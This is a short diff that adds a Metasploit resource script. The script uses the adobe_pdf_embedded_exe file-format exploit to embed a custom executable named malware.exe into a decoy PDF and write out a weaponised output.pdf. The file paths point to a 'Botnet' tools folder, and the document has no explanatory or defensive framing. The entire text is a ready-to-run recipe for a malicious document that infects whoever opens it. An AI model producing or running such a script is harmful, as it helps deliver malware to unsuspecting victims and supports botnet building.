@@ -1,0 +1,7 @@
+use exploit/windows/fileformat/adobe_pdf_embedded_exe
+set FILENAME output.pdf
+set INFILENAME /root/Bureau/Exploits/Botnet/Tools/random.pdf 
+set PAYLOAD generic/custom
+set PAYLOADFILE /root/Bureau/Exploits/Botnet/Bin/malware.exe
+exploit
+quit
